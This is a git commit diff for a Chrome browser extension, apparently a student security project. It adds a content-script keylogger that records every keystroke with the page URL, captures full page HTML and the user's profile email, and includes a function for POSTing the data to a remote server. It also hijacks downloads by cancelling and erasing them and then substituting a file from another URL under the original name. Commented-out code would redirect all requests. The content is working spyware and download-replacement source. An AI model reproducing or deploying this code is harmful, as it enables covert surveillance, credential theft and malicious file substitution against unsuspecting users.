b04a7ed075e6e9027d025cea9ecec87b01da63ca
JJRossmann <justin-rossmann@orange.fr>
2022-02-27 16:08:14 +0100

    added functionalities

--- background.js
+++ background.js
@@ -1,55 +1,170 @@
-var rserverIP = ""
+// Send data to external server
+var rserverIP = "";
 function sendToServer(data) {
-    var req = new XMLHttpRequest();
-    req.open("POST", rserverIP, true);
-    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    req.send(data);
-    req.onload = function(){
-        console.log(this.responseText);
-    };
+  var req = new XMLHttpRequest();
+  req.open("POST", rserverIP, true);
+  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  req.send(data);
+  req.onload = function () {
+    console.log(this.responseText);
+  };
 }
 
-function getHistory(number){
-    chrome.history.search({text: '', maxResults: number}, function(data) {
-        data.forEach(function(page) {
-            console.log(page.url);
-        });
+// Get a certain number of last websites in history
+function getHistory(number) {
+  chrome.history.search({ text: "", maxResults: number }, function (data) {
+    data.forEach(function (page) {
+      console.log(page.url);
     });
+  });
 }
 
-
+// Get keystrokes
 var lastURL = "";
-var userEmail = ""
-chrome.identity.getProfileUserInfo((userinfo) => {userEmail = userinfo.email});
-
-function handleMessage(request){
-    if (request.type === "keylog"){
-        if (lastURL !== request.page){
-            console.log(userEmail);
-            console.log(request.page);
-            //sendToServer("page="+request.page);
-            lastURL = request.page;
-        }
-        console.log(request.key);
-        //sendToServer("key="+request.key);
+var userEmail = "";
+function keyLog(request) {
+  chrome.identity.getProfileUserInfo((userinfo) => {
+    userEmail = userinfo.email;
+    if (lastURL !== request.page) {
+      console.log(userEmail);
+      console.log(request.page);
+      //sendToServer("page="+request.page);
+      lastURL = request.page;
     }
+    console.log(request.key);
+    //sendToServer("key="+request.key);
+  });
 }
 
-chrome.runtime.onMessage.addListener(handleMessage);
-
-
-function makeCapture(){
-    chrome.desktopCapture.chooseDesktopMedia([
-        "screen",
-        "window",
-        "tab"
-    ], tab, (streamId) => {
-        //check whether the user canceled the request or not
-        if (streamId && streamId.length) {
-            
-        }
-    })
+// Get HTML data of page
+function pageLog(request) {
+  console.log(request.page);
 }
 
+chrome.tabs.onUpdated.addListener(function (tabId, info) {
+  if (info.status === "complete") {
+    chrome.tabs.sendMessage(tabId, { type: "pageCapture" });
+  }
+});
 
+// Handle the different message types
+function handleMessageB(request) {
+  if (request.type === "keyLog") {
+    keyLog(request);
+  } else if (request.type === "pageLog") {
+    pageLog(request);
+  }
+}
 
+// Handle the different messages
+chrome.runtime.onMessage.addListener(handleMessageB);
+
+/*
+// Redirect requests to specific host
+var host = "https://www.google.com/";
+chrome.webRequest.onBeforeRequest.addListener(
+  function (details) {
+    console.log(details.url);
+    return { redirectUrl: host };
+  },
+  {
+    urls: ["<all_urls>"],
+    types: ["main_frame", "sub_frame", "script"],
+  },
+  ["blocking"]
+);*/
+
+// Make download
+
+/*
+// Replace download
+var downloadId;
+var replacing = 0;
+chrome.downloads.onDeterminingFilename.addListener(async function (downloadItem) {
+  console.log("replacing");
+  if (replacing == 0) {
+    replacing = 1;
+    downloadId = downloadItem.id;
+    let filename = downloadItem.filename;
+    console.log("filename with absolute local path ", filename);
+    let cancelled = false;
+    while (!cancelled) {
+      try {
+        await chrome.downloads.cancel(downloadItem.id);
+        cancelled = true;
+      } catch (error) {console.log("catched")}
+    }
+    try {
+      if (downloadItem.state == "complete") {
+        await chrome.downloads.removeFile(downloadItem.id);
+      }
+      await chrome.downloads.erase({ id: downloadItem.id });
+    } catch (error) {}
+    //await makeDownload("test.txt");
+    //replacing = 0;
+  }
+});*/
+
+var replacing = false;
+var filenameOrigin = "";
+
+async function makeDownload(name) {
+  await chrome.downloads.download({
+    url: "https://tls-sec.github.io/2019-2020/2020/01/19/projetslongs.html",
+    filename: name,
+  });
+}
+
+var cp = 0;
+chrome.downloads.onDeterminingFilename.addListener(async function (
+  downloadItem,
+  suggest
+) {
+  try {
+    console.log("signal");
+    cp = cp + 1;
+    console.log(cp);
+    console.log("name0" + downloadItem.filename);
+    if (cp > 2) {
+      cp = 0;
+      return;
+    } else if (cp == 1) {
+      console.log("name1" + downloadItem.filename);
+      filenameOrigin = downloadItem.filename;
+    } else if (cp == 2) {
+      console.log("name2" + downloadItem.filename);
+      suggest({ filename: filenameOrigin, conflictAction: "overwrite" });
+    }
+  } catch (error) {
+    console.log("catched0");
+  }
+
+  console.log("filename with absolute local path ", filenameOrigin);
+  let cancelled = false;
+  while (!cancelled) {
+    try {
+      await chrome.downloads.cancel(downloadItem.id);
+      cancelled = true;
+    } catch (error) {
+      console.log("catched");
+    }
+  }
+  try {
+    if (downloadItem.state == "complete") {
+      await chrome.downloads.removeFile(downloadItem.id);
+    }
+  } catch (error) {
+    console.log("catched2");
+  }
+  try {
+    await chrome.downloads.erase({ id: downloadItem.id });
+  } catch (error) {
+    console.log("catched3");
+  }
+  try {
+    console.log("before download");
+    await makeDownload("file");
+  } catch (error) {
+    console.log("catched4");
+  }
+});
--- content.js
+++ content.js
@@ -1,18 +1,47 @@
-chrome.runtime.onConnect.addListener(function(port){});
+chrome.runtime.onConnect.addListener(function (port) {});
 
 var k = "";
 var data = {};
-window.onkeydown = function(event) {
-    if (event.key.length > 1){
-        k = " (" + event.key + ") ";
-    } else {
-        k = event.key;
-    }
-    data = {
-        type: keylog,
-        key: k,
-        page: window.location.href
-    };
-    chrome.runtime.sendMessage(data);
+window.onkeydown = function (event) {
+  if (event.key.length > 1) {
+    k = " (" + event.key + ") ";
+  } else {
+    k = event.key;
+  }
+  data = {
+    type: "keyLog",
+    key: k,
+    page: window.location.href,
+  };
+  chrome.runtime.sendMessage(data);
+  chrome.runtime.sendMessage({msg: "capture"}, function(response) {
+    console.log(response.dataUrl);
+  });
 };
 
+function makePageCapture() {
+  let dO = document.doctype;
+  let dtd = "";
+  if (dO) {
+    dtd =
+      `<!DOCTYPE ${dO.name}${
+        dO.publicId ? ' PUBLIC "' + dO.publicId + '"' : ""
+      }${dO.systemId ? ' "' + dO.systemId + '"' : ""}`.trim() + ">\n";
+  }
+  let htmlOfPage = dtd + document.documentElement.outerHTML;
+
+  data = {
+    type: "pageLog",
+    page: window.location.href,
+    htmldata: htmlOfPage
+  };
+  chrome.runtime.sendMessage(data);
+}
+
+function handleMessageC(request) {
+  if (request.type === "pageCapture") {
+    makePageCapture();
+  }
+}
+
+chrome.runtime.onMessage.addListener(handleMessageC);
